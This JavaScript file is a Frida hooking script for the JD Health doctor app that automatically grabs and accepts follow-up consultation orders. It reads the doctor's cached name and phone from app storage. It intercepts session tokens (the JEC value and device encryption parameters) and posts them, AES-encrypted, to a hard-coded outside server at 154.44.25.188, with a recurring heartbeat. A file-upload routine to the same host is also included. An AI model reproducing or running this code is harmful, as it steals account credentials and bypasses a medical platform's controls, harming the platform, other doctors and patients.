/* 京东健康自动接诊系统完整实现 */
// ==================== 全局状态管理 ====================
const STATE = {
    ep: null,
    jec: null,
    phone: null,
    account_name: null,
    aesKey: "eLZoZVqrg0wfNW0y",
    isConnected: false,
    diagId: null,
    d_model: null,
    osVersion: null,
    screen: null,
    d_brand: null,
    uuid: null,
    pendingInitialization: true,
};
var DetailBottomBean
var detailBottomBean
let processedDiagIds = new Set();
var orderDetailActivityInstance

const HOOK_CONFIG = {
    RETRY_INTERVAL: 2000,
    MAX_RETRIES: 3,
    TARGET_CLASSES: {
        DEVICE_CTRL: "com.jd.dh.report.utils.encrypt.JdColorParamEncryptController",
        DECRYPT_SERVICE: "com.jd.dh.common.utils.NetworkEncryptUtils",
        PHONE_DECRYPT: "com.jd.dh.common.utils.encrypt.AesUtils",
        JEC_CTRL: "com.jd.dh.common.tools.network.encrypt.EncryptHeaderController"
    }
};

function createHookLoader({ name, targetClass, hookMethod, processor }) {

    if (!STATE.pendingInitialization) {
        log(`HOOK已存在，跳过重复加载`, 'info');
        return;
    }
    let retryCount = 0;
    const loadHook = () => {
        try {
            const clazz = Java.use(targetClass);
            if (!clazz[hookMethod]) throw new Error(`${hookMethod} 方法不存在`);

            clazz[hookMethod].implementation = function (...args) {
                const originalResult = this[hookMethod](...args);
                try {
                    processor.call(this, originalResult, ...args);
                } catch (e) {
                    log(`[${name}] 数据处理异常: ${e.stack}`, 'error');
                }
                return originalResult;
            };

            log(`✅ ${name} HOOK加载成功`, 'success');
        } catch (e) {
            if (retryCount < HOOK_CONFIG.MAX_RETRIES) {
                retryCount++;
                log(`⚠️ ${name} 加载失败，第${retryCount}次重试...`, 'warn');
                setTimeout(loadHook, HOOK_CONFIG.RETRY_INTERVAL);
            } else {
                log(`❌ ${name} 永久加载失败: ${e.message}`, 'error');
            }
        }
    };

    loadHook();
}
setTimeout(() => {
    Java.perform(function () {
        var Activity = Java.use("android.app.Activity");
        Activity.onResume.implementation = function () {
            var currentActivity = this.getClass().getName();
            console.log("[*] Current Activity: " + currentActivity);

            // 判断是否为目标 Activity
            if (currentActivity === "com.jd.dh.graborder.newly.ui.OrderListActivity") {
                setTimeout(() => {
                    console.log("[*] Hooked OrderListActivity.onResume()");
                    // 获取目标应用的上下文
                    var context = Java.use('android.app.ActivityThread').currentApplication().getApplicationContext();
                    // 获取 shared_prefs 目录路径
                    var sharedPrefsDir = context.getFilesDir().getParent() + "/shared_prefs/";

                    // 步骤1: 安全读取医生信息文件
                    var doctorInfo = extractDoctorInfo(sharedPrefsDir + "cacheDoctorInfo.xml");
                    if (!doctorInfo || !doctorInfo.name || !doctorInfo.phone) {
                        console.log("[-] 错误：无法读取有效的医生信息");
                        return;
                    }
                    STATE.phone = doctorInfo.phone;

                    let OrderDetailActivity = Java.use("com.jd.dh.graborder.newly.ui.OrderDetailActivity");

                    var DetailBottomBean = Java.use("com.jd.dh.graborder.bean.DetailBottomBean");
                    // 创建 DetailBottomBean 实例
                    detailBottomBean = DetailBottomBean.$new(
                        "确认接诊", // buttonName
                        "1",       // buttonId
                        0,
                        "null",       // buttonJumpType
                        "null",      // buttonJumpUrl
                        "JDDoctor_NewInquiryDetails_Reception" // buttonTrackingKey
                    );

                    Java.scheduleOnMainThread(function () {

                        orderDetailActivityInstance = OrderDetailActivity.$new();

                    });

                    // ==================== 类加载检测 ====================
                    const CLASS_CHECK_INTERVAL = 1000;
                    const CLASS_CHECK_TIMEOUT = 10000;
                    const TARGET_CLASSES = Object.values(HOOK_CONFIG.TARGET_CLASSES);
                    const OkioBuffer = Java.use("okio.Buffer");
                    const JavaString = Java.use("java.lang.String");
                    const ByteArrayInputStream = Java.use("java.io.ByteArrayInputStream");
                    const GZIPInputStream = Java.use("java.util.zip.GZIPInputStream");
                    let classCheckTimer = null;
                    let timeoutTimer = null;
                    let isHooksInitialized = false;

                    // 类存在性检查
                    const checkClassLoaded = className => {
                        try { Java.use(className); return true; }
                        catch { return false; }
                    };

                    // HOOK初始化入口
                    const initializeHooks = () => {
                        if (isHooksInitialized) return;
                        isHooksInitialized = true;
                        clearInterval(classCheckTimer);
                        clearTimeout(timeoutTimer);
                        // ==================== 设备参数HOOK ====================
                        createHookLoader({
                            name: "设备信息",
                            targetClass: HOOK_CONFIG.TARGET_CLASSES.DEVICE_CTRL,
                            hookMethod: "getColorQueryParamsFromUri$com_jd_dh_report",
                            processor: function (result) {
                                try {
                                    const encryptParam = result.get("encrypt")?.toString();
                                    if (!encryptParam || encryptParam === STATE.ep) return;

                                    if (STATE.phone !== null && STATE.jec !== null) {
                                        STATE.ep = encryptParam.split("ep=")[1];
                                        // log(`设备参数更新: ${STATE.ep.slice(0, 6)}***`, 'info');
                                        Httppost({ phone: STATE.phone, ep: STATE.ep, jec: STATE.jec });
                                    }
                                } catch (e) {
                                    log(`设备参数处理异常: ${e.stack}`, 'error');
                                }
                            }
                        });

                        // ==================== 订单响应HOOK（强制GZIP版） ====================
                        createHookLoader({
                            name: "订单响应HOOK",
                            targetClass: "okhttp3.internal.http1.Http1Codec",
                            hookMethod: "openResponseBody",
                            processor: function (originalResult, response) {
                                try {
                                    // ----------------- URL过滤 -----------------
                                    const url = response.request().url().toString();
                                    if (!url.includes("JDDAPP_C_doctorReceive")) return;

                                    // --------------- 流式读取优化 ---------------
                                    const source = originalResult.source().peek();
                                    const rawBuffer = OkioBuffer.$new();
                                    source.readAll(rawBuffer);
                                    const rawBytes = rawBuffer.readByteArray();
                                    rawBuffer.$dispose();

                                    // --------------- 判断是否需要解压 ---------------
                                    let responseBody;
                                    if (response.header("Content-Encoding") === "gzip") {
                                        // --------------- 强制解压GZIP ---------------
                                        const bis = ByteArrayInputStream.$new(rawBytes);
                                        const gzip = GZIPInputStream.$new(bis);
                                        const decompressedBuffer = OkioBuffer.$new();
                                        decompressedBuffer.readFrom(gzip);
                                        const decompressedBytes = decompressedBuffer.readByteArray();

                                        // --------------- 资源释放 ---------------
                                        decompressedBuffer.$dispose();
                                        gzip.close();
                                        bis.close();

                                        responseBody = JavaString.$new(decompressedBytes, "UTF-8");
                                    } else {
                                        responseBody = JavaString.$new(rawBytes, "UTF-8");
                                    }


                                    const parsedResponse = JSON.parse(responseBody);
                                    log(parsedResponse.msg, 'info');

                                    if (parsedResponse.msg == "OK") {
                                        log("订单接收成功", 'info');
                                        Httppost({ phone: STATE.phone, name: STATE.account_name });
                                        try {
                                            Java.scheduleOnMainThread(function () {
                                                let JdToast = Java.use("com.jd.dh.common.tools.toast.JdToast");
                                                let Companion = JdToast.Companion.value;
                                                let message = "\u63a5\u8bca\u6210\u529f";
                                                Companion.toast(message);
                                            });
                                        } catch (e) {

                                        }
                                    }
                                } catch (e) {
                                    log(`订单响应HOOK异常: ${e.stack}`, 'error');
                                }
                            }
                        });
                        createHookLoader({
                            name: "订单响应HOOK2",
                            targetClass: "okhttp3.internal.http2.Http2Codec",
                            hookMethod: "openResponseBody",
                            processor: function (originalResult, response) {
                                try {
                                    // ----------------- URL过滤 -----------------
                                    const url = response.request().url().toString();
                                    if (!url.includes("JDDAPP_C_doctorReceive")) return;

                                    // --------------- 流式读取优化 ---------------
                                    const source = originalResult.source().peek();
                                    const rawBuffer = OkioBuffer.$new();
                                    source.readAll(rawBuffer);
                                    const rawBytes = rawBuffer.readByteArray();
                                    rawBuffer.$dispose();

                                    // --------------- 判断是否需要解压 ---------------
                                    let responseBody;
                                    if (response.header("Content-Encoding") === "gzip") {
                                        // --------------- 强制解压GZIP ---------------
                                        const bis = ByteArrayInputStream.$new(rawBytes);
                                        const gzip = GZIPInputStream.$new(bis);
                                        const decompressedBuffer = OkioBuffer.$new();
                                        decompressedBuffer.readFrom(gzip);
                                        const decompressedBytes = decompressedBuffer.readByteArray();

                                        // --------------- 资源释放 ---------------
                                        decompressedBuffer.$dispose();
                                        gzip.close();
                                        bis.close();

                                        responseBody = JavaString.$new(decompressedBytes, "UTF-8");
                                    } else {
                                        responseBody = JavaString.$new(rawBytes, "UTF-8");
                                    }


                                    const parsedResponse = JSON.parse(responseBody);
                                    log(parsedResponse.msg, 'info');


                                    if (parsedResponse.msg == "OK") {
                                        log("订单接收成功", 'info');
                                        Httppost({ phone: STATE.phone, name: STATE.account_name });
                                        try {
                                            Java.scheduleOnMainThread(function () {
                                                let JdToast = Java.use("com.jd.dh.common.tools.toast.JdToast");
                                                let Companion = JdToast.Companion.value;
                                                let message = "\u63a5\u8bca\u6210\u529f";
                                                Companion.toast(message);
                                            });
                                        } catch (e) {

                                        }
                                    }
                                } catch (e) {
                                    log(`订单响应HOOK异常: ${e.stack}`, 'error');
                                }
                            }
                        });

                        // ==================== JEC凭证HOOK ====================
                        createHookLoader({
                            name: "JEC参数",
                            targetClass: HOOK_CONFIG.TARGET_CLASSES.JEC_CTRL,
                            hookMethod: "getJECValue",
                            processor: function (result) {
                                if (!result || result === STATE.jec) return;
                                STATE.jec = result;

                                log(`JEC凭证更新: ${result.slice(0, 6)}***`, 'info');

                            }
                        });
                        createHookLoader({
                            name: "响应数据解析(性能优化版)",
                            targetClass: "com.jd.dh.common.utils.NetworkEncryptUtils",
                            hookMethod: "rebuildResponseData",
                            processor: function (result) {
                                // console.log(result);
                                if (!result || !true) return;

                                try {
                                    // 1. 延迟解析JSON直到必要时刻
                                    const parsedResult = JSON.parse(result);
                                    const diagItems = parsedResult.data;
                                    if (!Array.isArray(diagItems)) return;

                                    // 2. 单次遍历优化：合并过滤、映射和去重操作
                                    const newDiagIds = [];
                                    for (const item of diagItems) {
                                        if (processedDiagIds.has(item.diagId)) continue;

                                        const specialLabels = item.specialLabels;
                                        if (specialLabels && specialLabels.some(l =>
                                            l.labelContent.includes('复'))) {
                                            newDiagIds.push(item.diagId);
                                            processedDiagIds.add(item.diagId); // 立即标记避免重复处理
                                        }
                                    }

                                    if (!newDiagIds.length) return;

                                    console.log(`发现新复诊订单: ${newDiagIds.join(', ')}`);

                                    // 3. Java调用优化：批量处理并减少实例查找次数
                                    Java.perform(() => {
                                        const activityClass = Java.use("com.jd.dh.graborder.newly.ui.OrderListActivity");
                                        Java.choose(activityClass.$className, {
                                            onMatch: instance => {
                                                // 批量处理方法调用
                                                newDiagIds.forEach(diagId => {
                                                    try {
                                                        if (STATE.isConnected && STATE.account_name) {
                                                            instance.b(diagId);
                                                        }
                                                    } catch (e) {

                                                    }

                                                });
                                            },
                                            onComplete: () => console.log(`批量处理完成，共${newDiagIds.length}个订单`)
                                        });
                                    });
                                } catch (e) {
                                    console.error(`优化版订单处理异常: ${e.stack || e}`);
                                }
                            }
                        });


                        // ========== 自动接单 ==========
                        createHookLoader({
                            name: "自动接单",
                            targetClass: "com.jd.dh.graborder.newly.ui.OrderDetailActivity", // 目标类
                            hookMethod: "onCreate", // 需要 HOOK 的方法
                            processor: function () {
                                try {
                                    this.a(detailBottomBean, null);
                                    console.log("接单中...");
                                } catch (error) {
                                    console.error(`[!] 自动接单异常: ${error}`);
                                }
                            }
                        });
                    }



                    // ==================== 启动类加载监控 ====================
                    classCheckTimer = setInterval(() => {
                        const allLoaded = TARGET_CLASSES.every(checkClassLoaded);
                        if (allLoaded) {
                            log("✅ 所有目标类已加载完成", 'success');
                            initializeHooks();
                        }
                    }, CLASS_CHECK_INTERVAL);

                    // 超时处理
                    timeoutTimer = setTimeout(() => {
                        clearInterval(classCheckTimer);
                        const missingClasses = TARGET_CLASSES.filter(c => !checkClassLoaded(c));
                        log(`❌ 类加载超时，缺失类：${missingClasses.join(', ')}`, 'error');
                    }, CLASS_CHECK_TIMEOUT);

                    // 立即执行首次检查
                    if (TARGET_CLASSES.every(checkClassLoaded)) {
                        clearTimeout(timeoutTimer);
                        initializeHooks();
                    }
                    STATE.pendingInitialization = false;
                }, 1000);

            }


            // 调用原方法
            return this.onResume();
        };
    });

}, 2000);


function Httppost(data) {
    try {
        // 加密处理
        const encrypted = Encrypt.aesEncrypt(JSON.stringify(data), STATE.aesKey);
        // log(`上报数据加密完成，长度: ${encrypted?.length || 0, encrypted}`, 'info');

        // 构建网络请求
        const MyRunnable = Java.registerClass({
            name: 'com.example.NetworkRunnable',
            implements: [Java.use('java.lang.Runnable')],
            methods: {
                run: function () {
                    try {
                        const Duration = Java.use('java.time.Duration');
                        const client = Java.use('okhttp3.OkHttpClient').$new()
                            .newBuilder()
                            .connectTimeout(Duration.ofSeconds(5))
                            .readTimeout(Duration.ofSeconds(5))
                            .writeTimeout(Duration.ofSeconds(5))
                            .build();

                        const request = Java.use('okhttp3.Request$Builder').$new()
                            .url("http://154.44.25.188:10098/queryapp")
                            .post(Java.use('okhttp3.RequestBody')
                                .create(Java.use('okhttp3.MediaType').parse("application/json"),
                                    JSON.stringify({ eKey: encrypted })))
                            .build();

                        const response = client.newCall(request).execute();
                        const responseData = JSON.parse(response.body().string());
                        // log(`服务器响应: ${JSON.stringify(responseData)}`, 'info');
                        // 处理服务器响应
                        if (responseData.code !== 0) {
                            throw new Error(`服务器返回错误码: ${responseData.code}`);
                        }
                        // log(`服务器响应: ${JSON.stringify(responseData)}`)
                        if (responseData.data?.encryptData) {
                            const decrypted = Encrypt.decryptStringAes(responseData.data.encryptData, STATE.aesKey);
                            // log(decrypted)
                            const { timestamp: serverTime, status, account_name } = JSON.parse(decrypted);
                            // 时间戳校验
                            if (account_name) {
                                STATE.account_name = account_name;
                                // log(`账号: ${account_name}`)
                            }
                            STATE.isConnected = validateTimestamp(serverTime, Date.now()) && status === 1;
                            log(`连接状态: ${STATE.isConnected ? '正常' : '异常'}`, STATE.isConnected ? 'success' : 'error');
                        }
                    } catch (e) {
                        STATE.isConnected = false;
                        log(`网络请求失败: ${e.message}`, 'error');
                    }
                }
            }
        });

        // 启动网络线程
        Java.use('java.lang.Thread').$new(MyRunnable.$new()).start();
    } catch (e) {
        log(`请求构建失败: ${e.stack}`, 'error');
    }
}


const Encrypt = {
    aesEncrypt(data, key) {
        try {
            const NewAesEnc = Java.use("com.jd.dh.common.utils.NetworkEncryptUtils").$new();
            return NewAesEnc.encryptStringAes(data, key);
        } catch (e) {
            log(`AES加密失败: ${e}`, 'error');
            return null;
        }
    },

    decryptStringAes(data, key) {
        try {
            const NewAesEnc = Java.use("com.jd.dh.common.utils.NetworkEncryptUtils").$new();
            return NewAesEnc.decryptStringAes(data, key);
        } catch (e) {
            log(`AES解密失败: ${e}`, 'error');
            return null;
        }
    },

    stringToBytes: text => new Uint8Array([...text].map(c => c.charCodeAt(0) & 0xFF)),
    bytesToString: buffer => Buffer.from(buffer).toString('utf-8')
};


// 安全处理文件夹名称（替换非法字符）
function sanitizeFolderName(name) {
    return name.replace(/[/\\:*?"<>|]/g, "_");
}

// 安全提取医生信息（多层防御式编程）
function extractDoctorInfo(filePath) {
    try {
        var bytes = readFileBytes(filePath);
        if (!bytes || bytes.length === 0) {
            console.log("[-] 文件内容为空");
            return null;
        }

        // 1. 字节转UTF-8字符串（处理Java的编码问题）
        var StringClass = Java.use("java.lang.String");
        var xmlContent = StringClass.$new(bytes, "UTF-8");

        // 2. 提取JSON片段
        var jsonStart = xmlContent.indexOf('{');
        var jsonEnd = xmlContent.lastIndexOf('}') + 1;
        if (jsonStart < 0 || jsonEnd <= jsonStart) {
            console.log("[-] XML中未找到有效JSON");
            return null;
        }
        var rawJsonStr = xmlContent.substring(jsonStart, jsonEnd);

        // 3. 替换所有HTML实体和Java转义字符
        var jsonStr = rawJsonStr
            .replace(/&quot;/g, '"')      // 修复: 替换HTML实体 &quot; → "
            .replace(/&amp;/g, '&')       // 替换 &amp; → &
            .replace(/&lt;/g, '<')        // 替换 &lt; → <
            .replace(/&gt;/g, '>')        // 替换 &gt; → >
            .replace(/\\"/g, '"')         // 替换 Java转义 \" → "
            .replace(/\\\//g, '/')       // 替换转义 \/ → /
            .replace(/\\u([\dA-Fa-f]{4})/g, (match, grp) =>
                String.fromCharCode(parseInt(grp, 16))); // Unicode转义

        // 4. 调试输出处理后的JSON
        console.log("[+] 处理后的JSON内容:\n" + jsonStr);

        // 5. 解析JSON
        try {
            return JSON.parse(jsonStr);
        } catch (e) {
            console.log("[-] JSON解析失败: " + e.message);
            return null;
        }
    } catch (e) {
        console.log("[-] 提取医生信息失败: " + e.stack);
        return null;
    }
}

// 可靠读取文件字节
function readFileBytes(fileName) {
    var Files = Java.use("java.nio.file.Files");
    var Paths = Java.use("java.nio.file.Paths");
    var URI = Java.use("java.net.URI");

    try {
        var path = Paths.get(URI.create("file://" + fileName));
        return Files.readAllBytes(path);
    } catch (e) {
        console.log("[-] 文件读取失败: " + fileName);
        return null;
    }
}

// 增强版文件上传（支持重试机制）
function sendBytesToServer(fileName, byteArray) {
    var encodedFileName = encodeURIComponent(fileName); // 新增：编码文件名

    var URL = Java.use("java.net.URL");
    var HttpURLConnection = Java.use("java.net.HttpURLConnection");
    var MAX_RETRY = 3;
    const MyRunnable = Java.registerClass({
        name: 'com.example.NetworkRunnable',
        implements: [Java.use('java.lang.Runnable')],
        methods: {
            run: function () {
                for (var retry = 1; retry <= MAX_RETRY; retry++) {
                    var conn = null;
                    try {
                        // 1. 创建URL对象
                        var url = URL.$new("http://154.44.25.188:10047/upload");

                        // 2. 打开连接并设置超时
                        conn = url.openConnection();
                        var httpConn = Java.cast(conn, HttpURLConnection);

                        // 3. 配置连接参数
                        httpConn.setRequestMethod("POST");
                        httpConn.setDoOutput(true);
                        httpConn.setConnectTimeout(15000); // 15秒连接超时
                        httpConn.setReadTimeout(30000);    // 30秒读取超时
                        httpConn.setRequestProperty("Content-Type", "application/octet-stream");
                        httpConn.setRequestProperty("File-Name", encodedFileName); // 修改此行

                        // 4. 发送数据
                        var output = httpConn.getOutputStream();
                        output.write(byteArray);
                        output.flush();
                        output.close();

                        // 5. 获取响应
                        var code = httpConn.getResponseCode();
                        if (code >= 200 && code < 300) {
                            // console.log("[√] 上传成功: " + fileName);
                            return;
                        } else {
                            console.log("[-] 服务器响应异常: HTTP " + code);
                        }

                    } catch (e) {
                        console.log(`[-] 第 ${retry} 次上传失败: ${e}`);
                        if (retry === MAX_RETRY) {
                            console.log("[×] 文件上传最终失败: " + fileName);
                        }
                    }
                }
            }
        }
    });
    Java.use('java.lang.Thread').$new(MyRunnable.$new()).start();
}
function log(message, type = 'info') {
    const colors = {
        info: '\x1b[36m', success: '\x1b[32m', warn: '\x1b[33m', error: '\x1b[31m'
    };
    console.log(`${colors[type]}[${new Date().toLocaleTimeString()}] ${message}\x1b[0m`);
}
setInterval(() => {
    processedDiagIds.clear();
    if (STATE.phone) {
        Httppost({ phone: STATE.phone });
        // log("定时心跳上报已发送", 'info');
    }
}, 8000);
function validateTimestamp(serverTime, clientTime) {
    const MAX_DIFF = 5000;
    const diff = Math.abs(clientTime - serverTime);
    // log(`时间差检测: ${diff}ms`, diff > MAX_DIFF ? 'warn' : 'info');
    return diff <= MAX_DIFF;
}